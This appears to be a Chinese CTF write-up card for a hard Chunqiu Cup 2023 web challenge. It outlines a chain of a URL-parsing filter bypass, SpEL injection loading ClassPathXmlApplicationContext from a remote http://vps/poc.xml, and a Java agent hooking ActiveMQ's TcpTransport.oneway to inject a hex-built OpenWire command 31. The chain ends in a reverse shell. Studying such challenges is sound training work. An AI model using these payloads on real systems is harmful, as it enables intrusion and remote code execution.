---
title: "利用 JavaAgent 插桩技术扩大攻击面以及反制攻击者"
category: web
tags: ["春秋杯", "web", "Java-Agent", "instrumentation", "ActiveMQ", "OpenWire"]
signals: ["春秋杯 2023", "Java-Agent", "instrumentation", "ActiveMQ", "OpenWire", "ClassPathXmlApplicationContext", "SPEL", "URL-parse-bypass", "broker-injection", "web_unknown", "Java", "Agent", "URL", "Filter"]
difficulty: hard
source: "https://www.ctfiot.com/159151.html"
tools: ["Java"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 利用 JavaAgent 插桩技术扩大攻击面以及反制攻击者

> 赛事：春秋杯 2023 | 方向：web | 难度：hard | 工具：Java

## 一句话总结

春秋杯 Java Agent 攻击：URL 解析绕 Filter + SPEL 注入 + Java agent 插桩 ActiveMQ broker 攻击 merchant 提权。

## 攻击链

1. Step 1: 绕 Filter - URL 解析 /api;a=b/changefood 保留 /api 字符但 endpoint 变成 "achangefood" 不等于 "changefood
2. Step 2: SPEL 注入 - foodServiceClassName=ClassPathXmlApplicationContext + name=http://vps/poc.xml 触发远程 XML RCE
3. Step 3: 通过 broker (player 用户) 攻击 merchant (root 用户) - Java agent 插桩 TcpTransport.oneway
4. Step 4: 构造 OpenWire command 31 协议: "1f01360000000000000100" + int2hex(className.length(),4) + string2hex(className) + int2hex(arg.length(),4) + string2hex(arg)
5. Step 5: 通过 broker 转发的 command 31 让 merchant 反序列化触发 ClassPathXmlApplicationContext RCE
6. Java agent SocketHook.agentmain 钩子 TcpTransport.oneway, 替换 wireFormat.marshal 后的 dataOut 内容
7. 提权: merchant root 启动 → 反弹 shell 读 /flag

## 关键 payload

```
/api;a=b/changefood + ClassPathXmlApplicationContext + Java agent hook TcpTransport.oneway + OpenWire command 31
```

## 经验教训

Java agent 插桩是横向移动的高阶武器；URL 解析差异（; 截断）可绕黑名单 filter；OpenWire 协议 command 31 是反序列化触发点。

## 标签

Java-Agent、instrumentation、ActiveMQ、OpenWire、ClassPathXmlApplicationContext、SPEL、URL-parse-bypass、broker-injection、SocketHook、agentmain

## 参考来源

- https://www.ctfiot.com/159151.html
- 原文件：利用JavaAgent插桩技术扩大攻击面以及反制攻击者.full.md
